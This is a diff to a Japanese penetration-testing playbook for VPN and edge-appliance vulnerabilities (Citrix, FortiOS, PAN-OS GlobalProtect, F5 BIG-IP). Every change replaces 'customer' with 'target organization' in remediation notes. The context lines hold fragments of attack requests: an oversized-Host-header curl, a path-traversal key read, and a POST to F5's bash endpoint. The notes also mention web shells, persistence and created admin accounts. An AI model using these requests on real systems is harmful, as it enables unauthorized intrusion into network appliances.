@@ -434,7 +434,7 @@ curl -sk -H "Host: $(python3 -c 'print("A"*24812)')" \
 ### 確認されたバージョン
 
 - 13.0-92.19 以降 / 13.1-49.15 以降 / 14.1-8.50 以降はパッチ済み
-- パッチ適用後も **既存セッションは自動失効しない**。**全セッションの強制失効 + LDAP/AD パスワードリセット** を顧客に依頼
+- パッチ適用後も **既存セッションは自動失効しない**。**全セッションの強制失効 + LDAP/AD パスワードリセット** を対象組織に依頼
 
 ---
 
@@ -481,7 +481,7 @@ python3 CVE-2024-21762-check.py https://[TARGET]   # [Attacker]
 ### 成功シグナル（検知系）
 
 - 特定リクエストでサーバが TCP RST を返す / 5xx ではなくタイムアウト
-- 装置の SSL-VPN プロセスが再起動した記録（顧客側 syslog で観察）
+- 装置の SSL-VPN プロセスが再起動した記録（対象組織側 syslog で観察）
 
 ### 確認されたバージョン
 
@@ -573,7 +573,7 @@ curl -sk "https://[TARGET]/api/v1/totp/user-backup-code/../../license/keys-statu
 ### 原状回復（必須）
 
 ```bash
-# [Attacker] 注入用に作成された一時ファイル / Web shell を装置側で削除（顧客実施）
+# [Attacker] 注入用に作成された一時ファイル / Web shell を装置側で削除（対象組織実施）
 # 装置ログ /var/log/messages / /data/var/dlogs/ の該当時刻のエントリを保全 → 検査試行と侵害指標の区別に必要
 ```
 
@@ -660,7 +660,7 @@ curl -sk https://[TARGET]/global-protect/portal/images/kedalab-test.txt   # [Att
 ### 原状回復
 
 ```bash
-# [Attacker] 作成した一時ファイルは顧客側で削除依頼
+# [Attacker] 作成した一時ファイルは対象組織で削除依頼
 # 装置側 /opt/pancfg/mgmt/locks/ / /var/log/pan/ の該当時刻ログを保全
 ```
 
@@ -703,7 +703,7 @@ curl -sk -X POST https://[TARGET]/mgmt/tm/util/bash \
 ### 原状回復
 
 ```bash
-# [Attacker] PoC で作成した永続化要素（cron / SSH 鍵 / admin ユーザー）は顧客に削除を依頼
+# [Attacker] PoC で作成した永続化要素（cron / SSH 鍵 / admin ユーザー）は対象組織に削除を依頼
 # 試行時刻と送信パケットを完全記録 → 侵害指標との切り分けに使う
 ```
 
@@ -733,8 +733,8 @@ curl -sk -X POST https://[TARGET]/mgmt/tm/util/bash \
 ### 原状回復
 
 ```bash
-# [Attacker] 作成された admin アカウントの削除を顧客に依頼
-# tmsh で確認・削除（顧客実施）
+# [Attacker] 作成された admin アカウントの削除を対象組織に依頼
+# tmsh で確認・削除（対象組織実施）
 # tmsh list auth user
 # tmsh delete auth user [CREATED_USER]
 ```
